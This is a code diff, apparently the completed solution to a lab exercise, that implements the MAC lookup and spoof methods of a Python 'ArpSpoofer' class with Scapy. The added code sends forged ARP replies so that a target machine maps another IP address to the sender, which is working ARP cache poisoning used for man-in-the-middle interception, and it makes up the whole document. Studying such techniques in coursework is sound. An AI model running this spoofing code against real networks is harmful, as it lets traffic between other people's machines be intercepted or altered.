@@ -49,16 +49,25 @@ class ArpSpoofer(object):
         If not initialized yet, sends an ARP request to the target and waits for a response.
         @return the mac address of the target.
         """
-        pass
+        if self.target_mac is not None:
+            return self.target_mac
+        arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=self.target_ip)
+        response = sr1(arp_request, timeout=5, verbose=False)
+        if response is not None:
+            self.target_mac = response[ARP].hwsrc
+            return self.target_mac
+        else:
+            raise Exception(f"Could not get target MAC address for IP {self.target_ip}")
+
 
     def spoof(self) -> None:
         """
         Sends an ARP spoof that convinces target_ip that we are spoof_ip.
         Increases spoof count b y one.
-        """        
-
-        # Your code here...
-
+        """
+        target_mac = self.get_target_mac()
+        arp_response = Ether(dst=target_mac) / ARP(op=2, pdst=self.target_ip, hwdst=target_mac, psrc=self.spoof_ip)
+        scapy.sendp(arp_response, iface=IFACE, verbose=False)
         self.spoof_count += 1
 
     def run(self) -> None:
